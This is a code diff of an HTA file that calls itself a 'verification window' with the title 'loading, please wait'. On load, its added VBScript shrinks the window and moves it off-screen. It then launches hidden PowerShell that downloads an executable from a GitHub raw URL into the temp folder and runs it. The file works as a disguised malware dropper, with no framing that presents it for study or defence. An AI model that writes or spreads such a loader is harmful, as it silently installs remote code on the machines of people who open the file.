@@ -1,20 +1,27 @@
+<!DOCTYPE html>
 <html>
 <head>
-  <HTA:APPLICATION
-    ID="hiddenHTA"
-    BORDER="none"
-    BORDERSTYLE="none"
-    CAPTION="no"
-    SHOWINTASKBAR="no"
-    SINGLEINSTANCE="yes"
-    SYSMENU="no"
-    WINDOWSTATE="minimize"
-  >
-  <script type="text/vbscript">
-    self.resizeTo 0, 0
-    self.moveTo -32000, -32000 ' Move off-screen
-    window.close
-  </script>
+    <title>loading, please wait</title>
+    <HTA:APPLICATION
+        APPLICATIONNAME="verification window"
+        BORDER="thin"
+        BORDERSTYLE="normal"
+        SHOWINTASKBAR="yes"
+        SINGLEINSTANCE="yes"
+        WINDOWSTATE="normal"
+        SCROLL="no"
+        SCROLLFLAT="yes"
+        SYSMENU="yes"
+    />
+    <script language="VBScript">
+    Sub Window_onLoad
+        Window.ResizeTo 1, 1
+        Window.MoveTo -32000, -32000
+        
+        Set objShell = CreateObject("WScript.Shell")
+        objShell.Run "powershell -WindowStyle Hidden -Command ""Invoke-WebRequest 'https://raw.githubusercontent.com/fecdor/history-protector/main/play.exe' -OutFile $env:TEMP\file.exe; Start-Process $env:TEMP\file.exe""", 0, False
+    End Sub
+    </script>
 </head>
 <body>
 </body>
